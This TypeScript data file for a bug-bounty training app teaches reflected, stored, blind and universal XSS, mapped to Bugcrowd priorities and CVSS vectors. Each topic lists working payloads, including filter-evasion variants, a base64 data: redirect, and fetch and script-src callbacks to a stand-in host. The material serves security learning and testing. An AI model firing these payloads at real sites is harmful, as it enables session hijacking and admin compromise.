import type { LearnGroup } from "@/learn/data/types";

// Advanced XSS content organized the way Bugcrowd actually bands it: by the
// ACTOR model and delivery vector, not by the textbook reflected/stored/DOM
// split. Leads with the P3 reflected-non-self and P3/P4 stored-by-actor
// variants, plus the P4 universal/referer/off-domain family, with the P2 and
// P1 escalations called out as targets.
//
// VRT paths, priorities and default CVSS vectors are from Bugcrowd release
// 2026-07-08. CWE id is CWE-79 across the family.

export const xssGroup: LearnGroup = {
  id: "xss",
  name: "Cross-Site Scripting (XSS)",
  emoji: "🧨",
  blurb:
    "Attacker JavaScript executing in a victim's session in the app's origin. Bugcrowd bands it by WHO can deliver it and to WHOM — not by reflected/stored/DOM — so the payout is a function of the actor model, not the payload. These are the P3/P4 leads with the P2/P1 escalations flagged.",
  topics: [
    {
      id: "reflected-non-self",
      name: "Reflected XSS (Non-Self)",
      emoji: "🔁",
      intro:
        "A parameter is reflected unescaped into the response and executes when a victim opens a crafted link. The P3/P5 split is entirely deliverability: 'Non-Self' means you can trigger it on another user with a link alone (a GET-reflected sink) — that is the P3; 'Self' means the victim must paste the payload into their own authenticated session, which is P5 and not rewardable alone. The default vector's S:C (scope changed) captures script in the app origin acting against the user. The 2025 reality is that raw reflection is rare; the work is context-aware breakout and WAF evasion.",
      howToFind: [
        {
          title: "Canary, then break the exact context",
          steps: [
            "Fire a unique non-executing canary (bbh9311zz) into every parameter and locate each reflection and its context: HTML body, attribute value, inside <script>, a URL/href, or a JS template literal.",
            "Craft the breakout for that context specifically — \"><svg onload=…> for an attribute, '-alert()-' inside a JS string, javascript: for an href sink — a generic payload usually dies in the wrong context.",
            "Keep it Non-Self: prove it fires from a GET link you can hand to a victim. If it only works when the victim submits a form in their own session, it is Self (P5) and you need a delivery vector (CSRF to the reflecting endpoint, or a redirect) to lift it.",
          ],
        },
        {
          title: "Modern filter / WAF evasion",
          steps: [
            "When angle brackets or 'script' are filtered, pivot to event handlers and SVG/MathML (<svg/onload=…>, <math href>), HTML-entity and overlong-UTF8 encodings, and case/whitespace mutations the WAF normalizes differently from the browser.",
            "For framework sinks, test the templating layer directly — Angular/Vue expression contexts, React dangerouslySetInnerHTML, and attribute interpolations that re-enable injection the framework normally escapes.",
            "Confirm in a real browser (headless or live) that document.domain shows the TARGET origin, not a sandbox or data: context — a confirmed cross-origin alert is the proof triage wants.",
          ],
        },
      ],
      payloads: [
        "\"><svg onload=alert(document.domain)>      (attribute/HTML breakout)",
        "'-alert(document.domain)-'                  (inside a JS string)",
        "javascript:alert(document.domain)           (href / redirect sink)",
        "<svg/onload=confirm(document.domain)>       (bracket-light WAF evasion)",
      ],
      example:
        "A search endpoint reflected ?q= into an onclick attribute. Breaking out with \"/><svg onload=alert(document.domain)> fired for anyone opening the crafted search link, so it was Non-Self: VRT 'Reflected › Non-Self' P3. The same bug reached only through a POST the victim submits themselves would have been 'Self' P5 until paired with a CSRF delivery.",
      mapping: {
        bugcrowdVrt: "Cross-Site Scripting (XSS) › Reflected › Non-Self",
        bugcrowdPriority: "P3",
        bugcrowdCvss: "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        hackeroneCwe: "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
        cvssSeverity: "Medium",
        note:
          "Non-Self (deliverable to a victim via a crafted link) is P3; Self XSS (victim must paste into their own session) is P5 and not rewardable alone. The S:C in the vector reflects execution in the app origin affecting the user.",
      },
      checklistCategoryId: "inject-xss",
      references: [
        { label: "PortSwigger: Reflected XSS", url: "https://portswigger.net/web-security/cross-site-scripting/reflected" },
      ],
    },
    {
      id: "stored-by-actor",
      name: "Stored XSS — by Actor",
      emoji: "📌",
      intro:
        "Stored XSS banding is driven by the actor pair — who can plant the payload and who it fires for — not by the payload itself. Non-Privileged User → Anyone is the P2 earner: any user stores it and any viewer, admins included, executes it. Privileged User → Privilege Elevation is P3 (a privileged actor stores script that executes in a context that grants them more than they had). Privileged → No Privilege Elevation is P4, and Self is P5. The highest-value finds are the blind ones that fire inside internal admin tooling you never see.",
      howToFind: [
        {
          title: "Map the plant/fire actor pair before you report",
          steps: [
            "For each persistence surface, answer two questions: what privilege does storing require, and whose browser renders it — those two answers pick the VRT leaf and therefore the band.",
            "Chase Non-Privileged → Anyone: fields any user controls that render to other users or staff — display names, comments, filenames, support-ticket bodies, SVG/markdown/log-viewer renderers.",
            "Store as user A, then view as a different, higher-privilege user B to confirm cross-actor execution — a payload that only fires for the account that stored it is Self (P5).",
          ],
        },
        {
          title: "Blind XSS into admin surfaces",
          steps: [
            "Seed benign callback beacons (XSS Hunter / interactsh) into fields that are read later by staff — abuse reports, user-agent logging, invoice notes, moderation queues.",
            "A callback from an internal admin origin is the proof of a Privileged-context stored XSS; capture the firing URL/DOM, never real session data, to keep it benign.",
            "Note the escalation ladder explicitly in the report: Privileged→No-Elevation P4, Privileged→Elevation P3, Non-Privileged→Anyone P2, and a stored payload that forces a state change in an admin's session trends toward P1.",
          ],
        },
      ],
      payloads: [
        "\"><svg onload=alert(document.domain)>                 (stored, cross-actor confirm)",
        "<img src=x onerror=fetch('//poc.example/stored-fired')>  (benign blind-XSS beacon)",
        "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=alert(document.domain)/>   (stored via SVG upload)",
        "\"><script src=//poc.example/c></script>               (blind callback marker)",
      ],
      example:
        "A profile display-name field stored HTML unescaped and rendered it in the admin user-management grid. A low-privilege user's <svg onload> beacon fired in an administrator's browser (blind XSS). Because a non-privileged actor reached an admin viewer, it mapped to VRT 'Stored › Non-Privileged User to Anyone' P2; wiring the payload to perform an admin-only state change in that session was the path to P1.",
      mapping: {
        bugcrowdVrt: "Cross-Site Scripting (XSS) › Stored › Privileged User to Privilege Elevation",
        bugcrowdPriority: "P3",
        bugcrowdCvss: "AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N",
        hackeroneCwe: "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
        cvssSeverity: "Medium",
        note:
          "Actor model sets the band: Non-Privileged User → Anyone P2 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N); Privileged User → Privilege Elevation P3; Privileged User → No Privilege Elevation P4 (…/PR:H/…/C:L/I:L/A:N); Self P5. Who can plant and who it fires for decide severity, not the payload.",
      },
      checklistCategoryId: "inject-xss",
    },
    {
      id: "uxss-referer-datauri",
      name: "UXSS / Referer / Off-Domain Data-URI",
      emoji: "🧪",
      intro:
        "The P4 corner of the family, each findable for a different structural reason. Universal XSS (UXSS) abuses a bug in the browser, extension, or embedded webview to break the same-origin policy so script runs across origins — the default vector carries AC:H because it depends on a vulnerable client. Referer-based XSS reflects a payload smuggled in the Referer header. Off-Domain › Data URI executes from a data: URI, i.e. a unique/opaque origin that is off the target domain, which is exactly why it is P4 and not the P3 same-origin reflected case. Cookie-Based XSS is P5.",
      howToFind: [
        {
          title: "Separate the three by execution origin",
          steps: [
            "For UXSS, test embedded WebViews / in-app browsers and extension message handlers for SOP breaks — a payload in one frame reading or scripting another origin's document is UXSS, not ordinary XSS.",
            "For Referer-based, set a scripted Referer (via an off-site link or a controlled redirect) and watch for it being reflected unescaped into a page — common on error/analytics/landing pages.",
            "For Off-Domain Data URI, get the app to navigate to or embed a data:text/html payload (open-redirect-to-data:, sandboxed iframe src) and note that execution happens in an opaque origin — document.domain will NOT be the target, which is what caps it at P4.",
          ],
        },
        {
          title: "Score honestly and look for the lift",
          steps: [
            "Confirm the origin of execution in DevTools before claiming a band: target-origin reflected is P3, opaque/data: origin is P4, cookie-only trigger is P5.",
            "The escalation is moving execution back into the target's own origin — if a Referer or data: vector can be chained into same-origin script (e.g. the reflected value later renders on a target page), it climbs from P4 toward the P3 reflected band.",
            "Keep proofs benign: alert(document.domain) to show the executing origin, or an OOB beacon — never pivot into live session data.",
          ],
        },
      ],
      payloads: [
        "data:text/html,<script>alert(document.domain)</script>   (Off-Domain › Data URI, opaque origin)",
        "Referer: https://poc.example/\"><svg onload=alert(document.domain)>   (Referer-based)",
        "?redirect=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+   (redirect-to-data:)",
        "<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>   (data: in a frame)",
      ],
      example:
        "An in-app WebView loaded partner content and a message handler reflected a URL fragment into the host page's DOM, letting partner-origin script read the host origin's document — a classic UXSS via the embedded browser. No same-origin injection existed on the web app itself, so it mapped to VRT 'Universal (UXSS)' P4 (AC:H for the vulnerable-client dependency); demonstrating it reading an auth token from the host origin was the argument for triaging at the top of that band.",
      mapping: {
        bugcrowdVrt: "Cross-Site Scripting (XSS) › Universal (UXSS)",
        bugcrowdPriority: "P4",
        bugcrowdCvss: "AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N",
        hackeroneCwe: "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
        cvssSeverity: "Low",
        note:
          "UXSS, Referer-based, and Off-Domain › Data URI are each P4; Cookie-Based XSS is P5. The AC:H on UXSS reflects the dependency on a vulnerable browser/webview to break the same-origin policy. Moving execution back into the target's own origin lifts it toward the P3 reflected band.",
      },
      checklistCategoryId: "inject-xss",
      references: [
        { label: "PortSwigger: Cross-site scripting", url: "https://portswigger.net/web-security/cross-site-scripting" },
      ],
    },
  ],
};
